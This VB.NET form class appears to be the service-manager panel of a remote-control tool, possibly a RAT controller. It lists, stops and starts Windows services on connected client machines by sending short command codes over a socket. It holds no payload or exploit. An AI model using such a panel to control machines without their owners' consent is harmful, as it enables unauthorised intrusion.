Imports System.ComponentModel
Imports System.Runtime.InteropServices
Imports System.ServiceProcess
Public Class Form40
    Dim rr As New TextBox
    Private msvc As ServiceController
    Private controllers As New System.Collections.Generic.SortedList(Of String, ServiceController)
    Public f As Form1
    Public xxx As Integer
    Dim state As Integer
    Dim time As Integer
    Public WithEvents bw As BackgroundWorker = New BackgroundWorker

    <DllImport("uxtheme", CharSet:=CharSet.Unicode)>
    Public Shared Function SetWindowTheme(ByVal hWnd As IntPtr, ByVal textSubAppName As String, ByVal textSubIdList As String) As Integer
    End Function


    Private Sub Form40_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ContextMenuStrip1.Renderer = New clsVistaToolStripRenderer
        HuraAlertBox1.Show()
        Me.Opacity = 0.8R
        rr.Text = 1
        Timer3.Enabled = True
        SetWindowTheme(lvServices.Handle, "explorer", Nothing)


        Form1.S.Send(xxx, "GOs")



        If state = 1 Then

            Timer1.Interval = time
            Timer1.Start()
        Else

            Timer1.Stop()
        End If





    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        lvServices.Items.Clear()
        If Not bw.IsBusy = True Then
            bw.RunWorkerAsync()

        End If


    End Sub






    Private Sub lvServices_SelectedIndexChanged(sender As Object, e As EventArgs) Handles lvServices.SelectedIndexChanged
        Dim xt$

        xt = lvServices.Items.Item(lvServices.FocusedItem.Index).SubItems.Item(0).Text()
        If xt = "Stopped" Then
            Q2ToolStripMenuItem.Enabled = True ' run
            Q1ToolStripMenuItem.Enabled = False ' stop 
        End If
        If xt = "Running" Then
            Q2ToolStripMenuItem.Enabled = False ' run
            Q1ToolStripMenuItem.Enabled = True  ' stop 
        End If


    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

        On Error Resume Next
        For Each Process As ListViewItem In lvServices.Items


            If Process.Text.Contains("Stopped") Then

                'Process.BackColor = Color.LightSteelBlue
                Process.ImageIndex = 0
            ElseIf Process.Text.Contains("Running") Then
                'Process.BackColor = Color.LightSteelBlue
                Process.ImageIndex = 1
            End If

        Next


        'Process.BackColor = Color.LightSteelBlue



    End Sub

    Private Sub Q1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q1ToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "Voz" & "|U|" & "0") ' stop
        Next
    End Sub

    Private Sub Q2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Q2ToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "Voz" & "|U|" & "1") ' run
        Next
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        rr.Text += 1

        If rr.Text = 25 Then
            HuraAlertBox1.Hide()
            Me.Opacity = 9.9R
            Timer3.Enabled = False
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        lvServices.Items.Clear()
        HuraAlertBox1.Show()
        Me.Opacity = 0.8R
        rr.Text = 1
        Timer3.Enabled = True
        Form1.S.Send(xxx, "GOs")
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Dim C As String
        C = lvServices.Items.Count.ToString
        ToolStripStatusLabel1.Text = "Service(" & C & ")"
    End Sub


End Class